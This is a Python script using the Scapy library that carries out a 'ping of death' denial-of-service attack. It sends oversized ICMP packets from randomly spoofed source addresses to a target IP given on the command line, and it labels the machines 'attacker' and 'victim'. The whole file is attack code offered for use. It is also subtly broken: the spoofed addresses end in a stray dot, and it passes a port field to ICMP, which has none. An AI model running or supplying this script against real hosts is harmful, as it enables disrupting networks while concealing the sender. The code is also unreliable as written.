#Extra packages needed for this to run: Scapy.py
from scapy.all import *
from datetime import datetime
import random



def random_address_generator():
    """ Generate a random spoofed src ip address"""
    addr = [1,1,1,1]
    d = "."
    addr[0] = str(random.randrange(11,197))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(2,254))
    return (addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d)


def ping(targetedIp, targetedPort, numOfPackages):
    spoofed_ip = random_address_generator()
    for i in range(0, numOfPackages):
        spoofed_ip = random_address_generator()
        time = datetime.now()
        print("[{0}]: Attacker PC pinging victim PC with IP:{1} with src IP:{2}".format(time.strftime("%H:%M:%S"),targetedIp,spoofed_ip))
        ip_header = IP(src=spoofed_ip, dst=targetedIp)
        packet = ip_header/ICMP(dport=targetedPort)/("d"*60000)
        send(packet)
if __name__ == "__main__":

    # The Ping of death algorithm works
    # by generating a random spoofed ip address
    # and then sending a big IPV4 packet to the targeted ip 
    """Cmd args: targetIp, TargetedPort, NumberOfPackagesToSend"""
    print("Preparing to ping victim PC")
    ping(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


